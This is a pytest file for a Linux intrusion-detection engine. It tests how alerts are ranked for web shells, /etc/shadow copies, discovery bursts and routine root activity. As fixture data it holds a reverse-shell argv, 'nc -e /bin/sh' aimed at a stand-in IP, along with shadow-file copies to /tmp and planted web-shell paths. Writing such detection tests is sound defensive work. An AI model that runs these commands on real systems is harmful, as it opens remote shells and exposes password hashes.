"""Routine root activity stays quiet while web shells, credential copies and bounded lineage keep their evidence."""
from datetime import timedelta

import pytest

from romulus.detect.linux_direct import CredentialMaterialAccess, KernelModuleLoad
from tests.test_bounded_host import T0, ev
from tests.test_linux_closeout import change
from tests.test_linux_sequences_r2 import detector, execution


def alert(port=443):
    return ev("net_alert", T0, host_name="sensor", source__ip="8.8.8.8", destination__ip="10.0.0.9",
              destination__port=port, alert__severity=1, alert__signature="ET SCAN generic")


def one_liner(t, uid, user, command="cd / && run-parts --report /etc/cron.hourly", path="/usr/bin/dash"):
    e = execution(t, path, uid=uid, process__user=user, host__ip=["10.0.0.9"])
    e.fields["process.argv"].value = ["/bin/sh", "-c", command]
    return e


def test_root_cron_one_liner_after_an_alert_is_not_a_finding(tmp_path):
    out = list(detector("corr.alert_then_host_execution", [alert(), one_liner(120, "0", "root")], tmp_path).finalize())
    assert out == []


def test_web_account_one_liner_after_an_alert_stays_high(tmp_path):
    out = list(detector("corr.alert_then_host_execution", [alert(), one_liner(120, "33", "www-data", "id")],
                        tmp_path).finalize())
    assert [m.proposed_lane for m in out] == ["high"]


@pytest.mark.parametrize("uid,user,command", [("110", "nagios", "/usr/lib/nagios/plugins/check_load -w 5 -c 10"),
                                              ("112", "zabbix", "cat /proc/loadavg")])
def test_monitoring_agent_one_liners_after_an_alert_are_not_findings(uid, user, command, tmp_path):
    out = list(detector("corr.alert_then_host_execution", [alert(), one_liner(120, uid, user, command)],
                        tmp_path).finalize())
    assert out == []


def test_a_reused_web_account_pid_from_before_the_alert_never_links_a_root_job(tmp_path):
    stale = execution(-7200, "/bin/sh", pid=500, ppid=11, uid="33", process__user="www-data", host__ip=["10.0.0.9"])
    job = one_liner(120, "0", "root")
    job.fields["process.ppid"].value = 500
    out = list(detector("corr.alert_then_host_execution", [alert(22), stale, job], tmp_path).finalize())
    assert out == []


def test_login_account_writable_executable_after_an_alert_is_a_lead(tmp_path):
    payload = execution(120, "/tmp/.x/payload", uid="1000", process__user="alice", host__ip=["10.0.0.9"])
    out = list(detector("corr.alert_then_host_execution", [alert(), payload], tmp_path).finalize())
    assert [m.proposed_lane for m in out] == ["lead"]


def web_shell(path="/var/www/html/uploads/sh.php", url="/uploads/sh.php", kind="create", user="www-data"):
    write = change(path=path, kind=kind, user=user)
    request = ev("http_access", T0 + timedelta(seconds=10), url__path=url, http__response__status_code=200)
    master = execution(-10, "/usr/sbin/php-fpm8.2", host="web1", pid=10, uid="0")
    worker = execution(-5, "/usr/sbin/php-fpm8.2", host="web1", pid=11, ppid=10, uid="33")
    child = execution(20, "/bin/bash", host="web1", pid=12, ppid=11, uid="33", process__user="www-data")
    child.fields["process.argv"].value = ["bash", "-c", "id"]
    return [master, worker, write, request, child]


@pytest.mark.parametrize("path,url", [
    ("/var/www/html/uploads/sh.php", "/uploads/sh.php"),
    ("/var/www/example.org/public_html/sh.php", "/sh.php"),
    ("/usr/share/nginx/html/sh.php", "/sh.php"),
    ("/var/lib/tomcat9/webapps/ROOT/cmd.jsp", "/cmd.jsp"),
    ("/var/lib/tomcat9/webapps/app/cmd.jsp", "/app/cmd.jsp"),
])
def test_web_shell_without_a_recorded_root_uses_the_packaged_layout(path, url, tmp_path):
    out = list(detector("host.web_shell_chain", web_shell(path, url), tmp_path).finalize())
    assert [m.proposed_lane for m in out] == ["urgent"]


def test_web_shell_without_interpreter_lineage_is_high(tmp_path):
    out = list(detector("host.web_shell_chain", web_shell()[:4], tmp_path).finalize())
    assert [m.proposed_lane for m in out] == ["high"]


@pytest.mark.parametrize("kind,user,lane", [("content", "www-data", "lead"), ("content", "deploy", "lead"),
                                            ("create", "deploy", "high")])
def test_rewrites_and_other_accounts_never_reach_urgent_through_a_coincident_worker_shell(kind, user, lane, tmp_path):
    out = list(detector("host.web_shell_chain", web_shell(kind=kind, user=user), tmp_path).finalize())
    assert [m.proposed_lane for m in out] == [lane]


def root_exec(argv, cwd=None):
    return ev("process_exec", T0, host_name="h", process__executable=f"/usr/bin/{argv[0]}", process__argv=argv,
              process__uid="0", process__user="root", **({"process__cwd": cwd} if cwd else {}))


@pytest.mark.parametrize("argv,cwd,lane", [
    (["cp", "/etc/shadow", "/tmp/.s"], None, "high"),
    (["cp", "/etc/shadow", "/etc/shadow.orig", "/root/s"], None, "high"),
    (["cp", "-p", "/etc/shadow", "shadow.bak"], "/var/backups", "lead"),
    (["cp", "/etc/shadow", "/etc/shadow.orig"], None, "lead"),
])
def test_root_backup_tool_argv_keeps_high_unless_every_destination_stays_in_backup_locations(argv, cwd, lane):
    [finding] = CredentialMaterialAccess().consume([root_exec(argv, cwd)])
    assert finding.proposed_lane == lane


@pytest.mark.parametrize("path", ["/usr/bin/sudo", "/usr/sbin/unix_chkpwd", "/bin/su", "/usr/bin/passwd",
                                  "/usr/lib/polkit-1/polkit-agent-helper-1"])
def test_packaged_setuid_helpers_reading_hashes_as_the_invoking_user_are_routine(path):
    read = ev("file_access", T0, host_name="h", file__path="/etc/shadow", file__access="read",
              audit__key="shadow", process__executable=path, process__uid="1000", process__euid="0")
    assert CredentialMaterialAccess().consume([read]) == []


def test_setuid_helper_name_outside_its_package_directory_stays_high():
    read = ev("file_access", T0, host_name="h", file__path="/etc/shadow", file__access="read",
              audit__key="shadow", process__executable="/tmp/sudo", process__uid="1000", process__euid="0")
    assert [m.proposed_lane for m in CredentialMaterialAccess().consume([read])] == ["high"]


@pytest.mark.parametrize("comm,lane", [("modprobe", "context"), ("insmod", "lead"), (None, "lead")])
def test_argvless_kmod_autoload_uses_the_recorded_applet(comm, lane):
    load = ev("kernel_module", T0, host_name="h", module__op="load", module__name="nf_tables",
              process__executable="/usr/bin/kmod", process__uid="0",
              **({"process__comm": comm} if comm else {}))
    assert [m.proposed_lane for m in KernelModuleLoad().consume([load])] == [lane]


def test_web_shell_discovery_through_separate_shells_groups_under_the_worker(tmp_path):
    events = [execution(-10, "/usr/sbin/php-fpm8.2", pid=10, uid="0"),
              execution(-5, "/usr/sbin/php-fpm8.2", pid=11, ppid=10, uid="33")]
    for i, name in enumerate(("whoami", "uname", "ss", "ps", "tree", "id")):
        shell = execution(i * 10, "/bin/dash", pid=200 + i, ppid=11 if i % 2 else 10, uid="33", process__user="www-data")
        shell.fields["process.argv"].value = ["sh", "-c", name]
        events += [shell, execution(i * 10 + 1, f"/usr/bin/{name}", pid=300 + i, ppid=200 + i, uid="33",
                                    process__user="www-data")]
    assert [m.proposed_lane for m in detector("host.discovery_burst", events, tmp_path).finalize()] == ["high"]


def test_web_shell_discovery_under_an_unrecorded_worker_still_groups(tmp_path):
    events = []
    for i, name in enumerate(("whoami", "uname", "ss", "ps", "tree", "id")):
        shell = execution(i * 10, "/bin/dash", pid=200 + i, ppid=11, uid="33", process__user="www-data")
        shell.fields["process.argv"].value = ["sh", "-c", name]
        events += [shell, execution(i * 10 + 1, f"/usr/bin/{name}", pid=300 + i, ppid=200 + i, uid="33",
                                    process__user="www-data")]
    assert [m.proposed_lane for m in detector("host.discovery_burst", events, tmp_path).finalize()] == ["high"]


@pytest.mark.parametrize("n", [2000, 8000])
def test_privilege_finalize_keeps_walked_processes_within_the_memory_budget(n, tmp_path):
    from romulus.detect.bounded import StateBudget
    from tests.test_linux_closeout import rule
    r = rule("host.unbrokered_privilege_transition")()
    r.spill_dir = tmp_path
    r.budget = StateBudget(tmp_path, disk_total=2**40, reserve=0, memory_total=2**20)
    events = []
    for i in range(n):
        a, b, c = 10000 + 3 * i, 10001 + 3 * i, 10002 + 3 * i
        events += [execution(i, "/usr/bin/sudo", pid=a, ppid=5, uid="1000", euid="0", process__auid="1000"),
                   execution(i + 0.1, "/bin/bash", pid=b, ppid=a, uid="0", process__auid="1000"),
                   execution(i + 0.2, "/usr/bin/id", pid=c, ppid=b, uid="0", process__auid="1000")]
    for start in range(0, len(events), 300):
        r.consume(events[start:start + 300])
        r.execs.trim()
    r.drain_staged()
    bound = len(r.execs.store.hot) + 3 * 512
    r.bind_loader(lambda ids: [])
    list(r.finalize())
    # The production hot size is a count cap; the memory budget bounds what parent walks bring back.
    assert r.execs.store.hot_size >= 10**6 and len(r.execs.store.hot) <= bound


def test_root_child_of_a_web_account_process_after_an_alert_stays_high(tmp_path):
    shell = execution(60, "/bin/bash", pid=20, ppid=11, uid="33", process__user="www-data", host__ip=["10.0.0.9"])
    nc = execution(120, "/usr/bin/nc", pid=21, ppid=20, uid="0", process__user="root", host__ip=["10.0.0.9"])
    nc.fields["process.argv"].value = ["nc", "-e", "/bin/sh", "203.0.113.8", "4445"]
    out = list(detector("corr.alert_then_host_execution", [alert(80), shell, nc], tmp_path).finalize())
    assert [m.proposed_lane for m in out] == ["high"]
    assert nc.id in {e.id for e in out[0].events}


def test_a_later_discovery_burst_under_a_long_lived_web_server_is_counted_and_cited(tmp_path):
    events = [execution(-10, "/usr/sbin/php-fpm8.2", pid=10, uid="0"),
              execution(-5, "/usr/sbin/php-fpm8.2", pid=11, ppid=10, uid="33"),
              execution(-4, "/usr/sbin/php-fpm8.2", pid=12, ppid=10, uid="33")]
    later = []
    for burst, (worker, start) in enumerate(((11, 0), (12, 5 * 86400))):
        for i, name in enumerate(("whoami", "uname", "ss", "ps", "tree", "id")):
            e = execution(start + i, f"/usr/bin/{name}", pid=1000 * (burst + 1) + i, ppid=worker, uid="33",
                          process__user="www-data")
            events.append(e)
            if burst:
                later.append(e.id)
    [finding] = detector("host.discovery_burst", events, tmp_path).finalize()
    assert finding.proposed_lane == "high" and "2 separate burst" in finding.claim
    assert set(later) & {e.id for e in finding.events}


@pytest.mark.parametrize("user", ["tomcat9", "jenkins", "postgres"])
def test_application_server_account_one_liner_after_an_alert_is_a_lead(user, tmp_path):
    out = list(detector("corr.alert_then_host_execution", [alert(8080), one_liner(120, "120", user, "id")],
                        tmp_path).finalize())
    assert [m.proposed_lane for m in out] == ["lead"]


@pytest.mark.parametrize("started,lanes", [(-120, ["high"]), (-3600, [])])
def test_web_account_ancestor_within_clock_skew_of_the_alert_still_links(started, lanes, tmp_path):
    shell = execution(started, "/bin/bash", pid=20, ppid=11, uid="33", process__user="www-data")
    nc = execution(120, "/usr/bin/nc", pid=21, ppid=20, uid="0", process__user="root", host__ip=["10.0.0.9"])
    nc.fields["process.argv"].value = ["nc", "-z", "203.0.113.8", "4445"]
    out = list(detector("corr.alert_then_host_execution", [alert(8081), shell, nc], tmp_path).finalize())
    assert [m.proposed_lane for m in out] == lanes
